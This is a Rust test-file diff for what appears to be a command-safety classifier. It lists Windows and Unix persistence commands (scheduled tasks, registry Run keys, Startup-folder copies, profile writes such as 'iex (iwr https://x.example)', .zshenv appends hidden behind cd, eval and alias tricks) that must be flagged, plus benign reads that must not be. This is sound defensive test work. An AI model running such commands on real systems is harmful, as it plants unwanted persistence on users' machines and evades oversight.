@@ -5483,6 +5483,184 @@ fn issue_1261_windows_reads_follow_only_plain_posix_scripts() {
     }
 }
 
+/// #1261 (D168): Windows places and commands that run code later (scheduled
+/// tasks, registry Run keys, the Startup folders, PowerShell profiles) are
+/// persistence on Windows, as cron, launchd and shell start-up files are
+/// elsewhere. Runs on every platform.
+#[test]
+fn issue_1261_windows_persistence_is_protected() {
+    use ProtectedActionKind::Persistence;
+    for line in [
+        r"schtasks /create /tn x /tr C:\work\x.exe /sc onlogon",
+        r"schtasks.exe /Change /TN x /TR C:\work\y.exe",
+        r"C:\Windows\System32\schtasks.exe -create -tn x -tr y -sc daily",
+        r"reg add HKCU\Software\Microsoft\Windows\CurrentVersion\Run /v x /d C:\work\x.exe",
+        r#"reg add "HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\RunOnce" /v x /d y /f"#,
+        r"reg add HKCU\Software\Microsoft\Windows\CurrentVersion\Policies\Explorer\Run /v x /d y",
+        r"reg add HKLM\Software\Wow6432Node\Microsoft\Windows\CurrentVersion\Run /v x /d y",
+        r"reg delete HKCU\Software\Microsoft\Windows\CurrentVersion\Run /v x /f",
+        "reg import settings.reg",
+        r"reg.exe restore HKCU\Software saved.hiv",
+        "regedit /s settings.reg",
+        r#"copy x.bat "%APPDATA%\Microsoft\Windows\Start Menu\Programs\Startup\x.bat""#,
+        r#"copy x.lnk "C:\ProgramData\Microsoft\Windows\Start Menu\Programs\StartUp\x.lnk""#,
+        r"echo x >> %USERPROFILE%\Documents\WindowsPowerShell\profile.ps1",
+        r"copy task.xml C:\Windows\System32\Tasks\x",
+    ] {
+        assert_eq!(cmd(line), Some(Persistence), "cmd /c {line}");
+    }
+    for line in [
+        "Register-ScheduledTask -TaskName x -Action $a -Trigger $t",
+        "Set-ScheduledTask -TaskName x -Action $a",
+        "Register-ScheduledJob -Name x -ScriptBlock { iwr x }",
+        "$s = New-Object -ComObject Schedule.Service",
+        r"Set-ItemProperty -Path 'HKCU:\Software\Microsoft\Windows\CurrentVersion\Run' -Name x -Value 'C:\work\x.exe'",
+        r"New-ItemProperty -Path HKCU:\Software\Microsoft\Windows\CurrentVersion\RunOnce -Name x -Value y",
+        r"New-ItemProperty -Path Registry::HKEY_CURRENT_USER\Software\Microsoft\Windows\CurrentVersion\Run -Name x -Value y",
+        r"Set-Location HKCU:\Software\Microsoft\Windows\CurrentVersion\Run; New-ItemProperty -Path . -Name x -Value y",
+        r"& reg.exe add HKCU\Software\Microsoft\Windows\CurrentVersion\Run /v x /d y",
+        "Add-Content $PROFILE 'iex (iwr https://x.example)'",
+        "'x' | Out-File -Append $profile.CurrentUserAllHosts",
+        "New-Item -ItemType File -Force -Path $PROFILE",
+        r#"Set-Content "$env:APPDATA\Microsoft\Windows\Start Menu\Programs\Startup\x.cmd" 'x'"#,
+        r#"Copy-Item x.ps1 "$HOME\Documents\PowerShell\Microsoft.PowerShell_profile.ps1""#,
+        r#"Copy-Item -Recurse m "$HOME\OneDrive\Documents\WindowsPowerShell\Modules\m""#,
+        r#"Copy-Item -Recurse m "$HOME\OneDrive - Contoso\Documents\PowerShell\Modules\m""#,
+        r"Remove-Item -Recurse $HOME\Documents\WindowsPowerShell",
+        r"Copy-Item x.ps1 C:\Windows\System32\WindowsPowerShell\v1.0\profile.ps1",
+        r"Copy-Item x.ps1 'C:\Program Files\PowerShell\7\Microsoft.PowerShell_profile.ps1'",
+        // Review 1: launchers before the command, wildcard key names, the
+        // places' variables.
+        r"cmd /c reg add HKCU\Software\Microsoft\Windows\CurrentVersion\Run /v x /d C:\x.exe",
+        r#"pwsh -c "Set-ItemProperty HKCU:\Software\Microsoft\Windows\CurrentVersion\Run -Name x -Value y""#,
+        r"Set-ItemProperty -Path HKCU:\Software\Microsoft\Windows\CurrentVersion\R* -Name x -Value y",
+        "Enable-ScheduledTask -TaskName x",
+        r"Copy-Item p.ps1 $PSHOME\profile.ps1",
+        r#"Copy-Item x.lnk "$env:ProgramData\Microsoft\Windows\Start Menu\Programs\Startup\x.lnk""#,
+    ] {
+        assert_eq!(powershell(line), Some(Persistence), "{line}");
+    }
+    for line in [
+        r#"cmd /c "reg add HKCU\Software\Microsoft\Windows\CurrentVersion\Run /v x /d y""#,
+        r#"copy x.lnk "%ProgramData%\Microsoft\Windows\Start Menu\Programs\Startup\x.lnk""#,
+        r#"copy x.lnk "%ALLUSERSPROFILE%\Microsoft\Windows\Start Menu\Programs\Startup\x.lnk""#,
+        r"copy t.xml %windir%\System32\Tasks\x",
+        r"copy t.xml %SystemRoot%\System32\Tasks\x",
+        r#"copy p.ps1 "%ProgramFiles%\PowerShell\7\profile.ps1""#,
+    ] {
+        assert_eq!(cmd(line), Some(Persistence), "cmd /c {line}");
+    }
+    // Review 2: anywhere in the command, past subexpressions and options.
+    for line in [
+        r"Write-Output (New-ItemProperty -Path HKCU:\Software\Microsoft\Windows\CurrentVersion\Run -Name x -Value C:\x.exe)",
+        r"echo $(reg add HKCU\Software\Microsoft\Windows\CurrentVersion\Run /v x /d C:\x.exe /f)",
+        r#"powershell -ExecutionPolicy Bypass -Command "reg import evil.reg""#,
+        "Write-Output (reg import evil.reg)",
+        r"Set-ItemProperty -Path HKCU:\Software\Microsoft\Windows\CurrentVer*\Run -Name x -Value y",
+    ] {
+        assert_eq!(powershell(line), Some(Persistence), "{line}");
+    }
+    for line in [
+        "if exist evil.reg reg import evil.reg",
+        "for %f in (*.reg) do reg import %f",
+        r#"start "Setup" regedit /s evil.reg"#,
+    ] {
+        assert_eq!(cmd(line), Some(Persistence), "cmd /c {line}");
+    }
+    // Review 3: a reader piped into a writer, help around a call, .NET
+    // writers, attached ProgIDs, `.` and `..` in a key.
+    for line in [
+        r"Get-Item 'HKCU:\Software\Microsoft\Windows\CurrentVersion\Run' | New-ItemProperty -Name x -Value C:\x.exe",
+        r"gp HKCU:\Software\Microsoft\Windows\CurrentVersion\Run | ForEach-Object { Set-ItemProperty $_.PSPath -Name x -Value y }",
+        "Get-Help (Register-ScheduledTask -TaskName x -Action $a -Trigger $t)",
+        r"Write-Output ([Microsoft.Win32.Registry]::SetValue('HKEY_CURRENT_USER\Software\Microsoft\Windows\CurrentVersion\Run','x','y'))",
+        "$s = New-Object -ComObject:Schedule.Service",
+        "$s = New-Object -ComObject Schedule.Service.1",
+        r"Set-ItemProperty -Path HKCU:\Software\Microsoft\Windows\CurrentVersion\.\Run -Name x -Value y",
+        r"Set-ItemProperty -Path HKCU:\Software\Microsoft\Windows\CurrentVersion\x\..\Run -Name x -Value y",
+    ] {
+        assert_eq!(powershell(line), Some(Persistence), "{line}");
+    }
+    // Review 2: a start-up place's variable is plain text in the other
+    // shell, so the line is also judged as if it were (as on main).
+    let in_home = |argv: &[&str]| windows_kind_with(WINDOWS_HOME, WINDOWS_USER_HOME, argv);
+    assert_eq!(
+        in_home(&[
+            "powershell.exe",
+            "-NoProfile",
+            "-Command",
+            r"Add-Content %windir%\..\.bashrc x"
+        ]),
+        Some(Persistence)
+    );
+    assert_eq!(
+        in_home(&[
+            "cmd.exe",
+            "/c",
+            r"echo x >> $PROFILE\..\..\..\..\Users\fixture\.bashrc"
+        ]),
+        Some(Persistence)
+    );
+    assert_eq!(
+        in_home(&["cmd.exe", "/c", r"cd %ProgramData%\.. & echo x > .bashrc"]),
+        Some(Persistence)
+    );
+    // Review 1: cmd has no `%PROFILE%`: climbing out of it stays unknown.
+    assert_eq!(
+        cmd(
+            r#"copy x.bat "%PROFILE%\..\..\AppData\Roaming\Microsoft\Windows\Start Menu\Programs\Startup\x.bat""#
+        ),
+        Some(ProtectedActionKind::UnseenCode)
+    );
+}
+
+/// #1261 (D168): reading those places, and ordinary work near them, is not
+/// persistence.
+#[test]
+fn issue_1261_windows_persistence_reads_are_not_protected() {
+    for line in [
+        "schtasks /query /tn x",
+        r"reg query HKCU\Software\Microsoft\Windows\CurrentVersion\Run",
+        r"reg export HKCU\Software\Microsoft\Windows\CurrentVersion\Run run.reg",
+        r"type %USERPROFILE%\Documents\WindowsPowerShell\profile.ps1",
+        r#"dir "%APPDATA%\Microsoft\Windows\Start Menu\Programs\Startup""#,
+        r"copy notes.txt %USERPROFILE%\Documents\notes.txt",
+        "echo run the tests",
+    ] {
+        assert_eq!(cmd(line), None, "cmd /c {line}");
+    }
+    for line in [
+        r"Get-ItemProperty HKCU:\Software\Microsoft\Windows\CurrentVersion\Run",
+        r"Test-Path HKCU:\Software\Microsoft\Windows\CurrentVersion\RunOnce",
+        "Get-ScheduledTask",
+        "Get-Content $PROFILE",
+        "Test-Path $PROFILE",
+        "Write-Output $PROFILE",
+        r"Write-Output 'see CurrentVersion\Run'",
+        r"Set-Content -Path $HOME\Documents\notes.txt -Value x",
+        "cargo run --release",
+        // Review 1.
+        r#"powershell -NoProfile -Command "Get-ItemProperty HKCU:\Software\Microsoft\Windows\CurrentVersion\Run""#,
+        "node src/FileExplorer/RunButton.js",
+        "cargo test --manifest-path crates/explorer/runtime/Cargo.toml",
+        r"Get-ChildItem HKCU:\Software\Microsoft\Windows\CurrentVersion\Runtime",
+        // Review 2.
+        r"$r = Get-ItemProperty HKCU:\Software\Microsoft\Windows\CurrentVersion\Run",
+        r"powershell -ExecutionPolicy Bypass -c Get-ItemProperty HKCU:\Software\Microsoft\Windows\CurrentVersion\Run",
+        "cat deploy/schedule.service",
+        r"Remove-Item -Recurse build\chkupdate\*\*",
+        r"Get-ChildItem C:\work\build\*\*",
+    ] {
+        assert_eq!(powershell(line), None, "{line}");
+    }
+    for line in [
+        r#"cmd /c "reg query HKCU\Software\Microsoft\Windows\CurrentVersion\Run""#,
+        "taskkill /im regedit.exe /f",
+    ] {
+        assert_eq!(cmd(line), None, "cmd /c {line}");
+    }
+}
+
 /// #1283: the word lexer splits quoted text (and unquoted commas), so a
 /// value's text could read as a `git config` option: `--comment 'x --get'`
 /// made a write read as a read, and a quoted `-f` value hid `-e`. git is
@@ -5734,5 +5912,151 @@ fn issue_1261_windows_login_shells_and_cygwin_links_are_not_read() {
         ["bash", "-c", "bash plain_link.sh"],
     ] {
         assert_eq!(classify(&argv), Some(UnseenCode), "{argv:?}");
+    }
+}
+
+/// #1309: more ways a nested script's folder becomes one the quote-aware
+/// reading cannot know: a wrapper's folder option in other spellings,
+/// `CDPATH`-style lookups, the folder stack, `cd` in a function, alias,
+/// `eval` or sourced file, and code that runs later than it is read. A
+/// relative write in such a script asks.
+#[test]
+#[cfg_attr(
+    windows,
+    ignore = "Unix fixtures (POSIX paths and shell syntax); Windows coverage is #691"
+)]
+fn issue_1309_unknown_folders_ask() {
+    for command in [
+        // A wrapper's folder, attached, clustered, abbreviated or under
+        // another wrapper's option.
+        r#"D=~; env -C"$D" sh -c 'echo x >> .zshenv'"#,
+        "env -C~ sh -c 'echo x >> .zshenv'",
+        "env -iC ~ sh -c 'echo x >> .zshenv'",
+        "env --chd ~ sh -c 'echo x >> .zshenv'",
+        "sudo -D ~ sh -c 'echo x >> .zshenv'",
+        "sudo -D~ sh -c 'echo x >> .zshenv'",
+        r#"nsenter --wd="$HOME" sh -c 'echo x >> .zshenv'"#,
+        r#"nsenter -w"$HOME" sh -c 'echo x >> .zshenv'"#,
+        "docker exec -w ~ c sh -c 'echo x >> .zshenv'",
+        r#"systemd-run --working-directory="$HOME" sh -c 'echo x >> .zshenv'"#,
+        "systemd-run -p WorkingDirectory=~ sh -c 'echo x >> .zshenv'",
+        r"find ~/.bashrc -execdir sh -c 'echo x >> .zshenv' \;",
+        "parallel --wd ~ 'echo x >> .zshenv' ::: 1",
+        // Where `cd` looks things up.
+        "CDPATH=~ cd .; sh -c 'echo x >> .zshenv'",
+        "shopt -s cdable_vars; h=~; cd h; sh -c 'echo x >> .zshenv'",
+        "OLDPWD=~; cd -; sh -c 'echo x >> .zshenv'",
+        // The folder stack and zsh's other spellings.
+        "cd ~; pushd /tmp; pushd; sh -c 'echo x >> .zshenv'",
+        "chdir ~; sh -c 'echo x >> .zshenv'",
+        "cd /tmp; cd tmp home; sh -c 'echo x >> .zshenv'",
+        // `cd` in code that runs elsewhere in the line.
+        "go() { cd ~; }; cd /tmp; go; sh -c 'echo x >> .zshenv'",
+        "function go { cd ~; }; cd /tmp; go; sh -c 'echo x >> .zshenv'",
+        "alias go='cd ~'; go; sh -c 'echo x >> .zshenv'",
+        "eval 'cd ~'; sh -c 'echo x >> .zshenv'",
+        "eval cd ~; sh -c 'echo x >> .zshenv'",
+        ". ./x.sh; sh -c 'echo x >> .zshenv'",
+        // Code that runs later than it is read.
+        "f() { sh -c 'echo x >> .zshenv'; }; cd ~; f",
+        "f() { sh -c 'echo x >> .zshenv'; }; D=~; cd \"$D\"; f",
+        "for i in 1 2; do sh -c 'echo x >> .zshenv'; cd ~; done",
+        "cd ~/a/b; while true; do cd ..; sh -c 'echo x >> .zshenv'; done",
+        "trap \"sh -c 'echo x >> .zshenv'\" EXIT; cd ~",
+        // Review 1: a loop after a reserved word, a `cd` the carrier's
+        // quoting splits, tilde forms of the folder stack, `pushd -n`, a
+        // first `cd -`, and nsenter's `--wdns`.
+        "if :; then for i in 1 2; do sh -c 'echo x >> .zshenv'; cd ~; done; fi",
+        "while :; do for i in 1 2; do sh -c 'echo x >> .zshenv'; cd ~; done; break; done",
+        r"eval 'c\d ~'; sh -c 'echo x >> .zshenv'",
+        r#"alias go='c""d ~'; go; sh -c 'echo x >> .zshenv'"#,
+        "cd ~; cd /tmp; cd ~-; sh -c 'echo x >> .zshenv'",
+        "cd ~; cd ~+; sh -c 'echo x >> .zshenv'",
+        "pushd ~; pushd /tmp; cd ~1; sh -c 'echo x >> .zshenv'",
+        "cd ~; pushd -n /tmp; sh -c 'echo x >> .zshenv'",
+        "cd -; sh -c 'echo x >> .zshenv'",
+        // Review 2: a `cd -` after a change that may not have happened;
+        // carrier text the shell matches or expands again.
+        "false && cd /tmp; cd -; sh -c 'echo x >> .zshenv'",
+        "(cd /tmp); cd -; sh -c 'echo x >> .zshenv'",
+        "touch cd; eval 'c?'; sh -c 'echo x >> .zshenv'",
+        "eval '[c]d'; sh -c 'echo x >> .zshenv'",
+        "ln -s ~ d; eval '{c,}d'; sh -c 'echo x >> .zshenv'",
+        "alias go='c?'; go; sh -c 'echo x >> .zshenv'",
+        // Review 3: `pushd -`; carrier text that loads more text.
+        "pushd -; sh -c 'echo x >> .zshenv'",
+        "(cd /tmp); pushd -; sh -c 'echo x >> .zshenv'",
+        "eval . ./f; sh -c 'echo x >> .zshenv'",
+        "eval source f; sh -c 'echo x >> .zshenv'",
+        "eval '. ./f'; sh -c 'echo x >> .zshenv'",
+        "trap '. ./f' DEBUG; sh -c 'echo x >> .zshenv'",
+        "alias go=.; go ./f; sh -c 'echo x >> .zshenv'",
+        "alias go=eval; go cd; sh -c 'echo x >> .zshenv'",
+        r#"nsenter --wdns="$HOME" sh -c 'echo x >> .zshenv'"#,
+        r#"nsenter -W"$HOME" sh -c 'echo x >> .zshenv'"#,
+        // An output file too.
+        "env -iC ~ sh -c 'git config -f .zshenv --comment x,--get a.b v'",
+        "alias go='cd ~'; go; sh -c 'git config -f .zshenv --comment x,--get a.b v'",
+    ] {
+        assert_eq!(
+            script(command),
+            Some(ProtectedActionKind::Persistence),
+            "{command}"
+        );
+    }
+    // Already asked on main; kept as regressions.
+    for command in [
+        "read D <<< ~; cd \"$D\"; sh -c 'echo x >> .zshenv'",
+        "printf -v D %s ~; cd \"$D\"; sh -c 'echo x >> .zshenv'",
+        "for D in ~; do cd \"$D\"; sh -c 'echo x >> .zshenv'; done",
+        "sh -c 'cd \"$1\"; sh -c \"echo x >> .zshenv\"' _ ~",
+        "cd \"$XDG_CONFIG_HOME\"; sh -c 'echo x >> .zshenv'",
+        "go() { cd \"$1\"; }; go ~; sh -c 'echo x >> .zshenv'",
+    ] {
+        assert_eq!(
+            script(command),
+            Some(ProtectedActionKind::Persistence),
+            "{command}"
+        );
+    }
+    for command in [
+        "cd /tmp; sh -c 'echo x > out.txt'",
+        "sh -c 'echo x > out.txt'; cd /tmp",
+        "DIR=$(cd \"$(dirname \"$0\")\" && pwd); sh -c 'echo x > out.txt'",
+        "cd /tmp; for i in 1 2; do sh -c 'echo x > out.txt'; done",
+        "for i in 1 2; do echo $i; done; sh -c 'echo x > out.txt'",
+        "xargs -d '\\n' sh -c 'echo x > out.txt'",
+        "env -i sh -c 'echo x > out.txt'",
+        "sudo -u me sh -c 'echo x > out.txt'",
+        "docker exec -it c sh -c 'echo x > out.txt'",
+        "git -C /tmp commit -m 'fix (x): cd into it'",
+        "pushd /tmp; popd; sh -c 'echo x > out.txt'",
+    ] {
+        assert_eq!(script(command), None, "{command}");
+    }
+}
+
+/// #1309: the new checks stay linear when the words they read repeat.
+#[test]
+#[cfg_attr(
+    windows,
+    ignore = "Unix fixtures (POSIX paths and shell syntax); Windows coverage is #691"
+)]
+fn issue_1309_checks_are_linear() {
+    for (label, unit) in [
+        // Absolute folders: a chain of relative ones (`cd b; cd b`) grows
+        // the followed path up to `MAX_FOLDER_BYTES`, on main too.
+        ("changes after scripts", "sh -c 'echo x > a'; cd /b; "),
+        ("loops", "for i in 1; do cd /b; done; "),
+        ("wrapper options", "env -iC b --chd=b -D b "),
+        ("lookups", "CDPATH=b OLDPWD=b "),
+        ("carriers", "eval 'cd /b'; "),
+    ] {
+        work::assert_linear(label, |scale| {
+            let line = format!("f() {{ :; }}; {} sh -c 'echo x'", unit.repeat(200 * scale));
+            let _ = script(&line);
+            let line = format!("{} sh -c 'echo x'", unit.repeat(200 * scale));
+            let _ = script(&line);
+        });
     }
 }
